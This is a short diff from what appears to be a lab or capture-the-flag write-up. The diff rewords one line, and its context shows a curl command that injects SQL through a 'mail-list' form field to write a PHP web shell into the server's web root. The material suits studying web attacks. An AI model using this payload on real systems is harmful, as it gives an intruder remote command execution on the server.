@@ -47,7 +47,7 @@ when asked for the path, I provided `/var/www/html/media`. */var/www/html* becau
 
 *ALTERNATIVE*
 
-This can be also be achieved using curl with the command:
+This can be also be achieved using the curl command:
 ```bash
 curl -X POST http://<target_ip>/ -s \
   -d "mail-list=a@a.com' UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system(\$_GET[\"cmd\"]); ?>','' INTO OUTFILE '/var/www/html/media/shell.php'#" \
